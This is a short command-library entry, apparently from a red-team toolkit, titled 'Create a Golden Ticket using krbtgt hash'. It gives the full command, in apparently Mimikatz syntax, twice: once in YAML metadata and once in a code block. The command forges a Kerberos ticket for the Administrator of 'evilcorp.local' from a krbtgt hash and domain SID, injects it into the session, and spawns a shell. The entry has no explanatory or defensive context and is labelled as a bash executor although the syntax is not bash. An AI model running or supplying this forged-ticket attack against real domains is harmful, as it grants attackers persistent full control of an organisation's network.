---
id: 648cd6d9-5c7e-43b6-a83b-d3ff1983c63e
name: Create a Golden Ticket using krbtgt hash
type: command
executor: bash
data: 'kerberos::golden /domain:evilcorp.local /sid:S-1-5-21-258778211-3859232159-551458613
  /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /user:Administrator /ptt

  misc::cmd

  '
output: null
created_at: '2020-07-15T19:05:44.367222+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Create a Golden Ticket using krbtgt hash

```bash
kerberos::golden /domain:evilcorp.local /sid:S-1-5-21-258778211-3859232159-551458613 /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /user:Administrator /ptt
misc::cmd

```


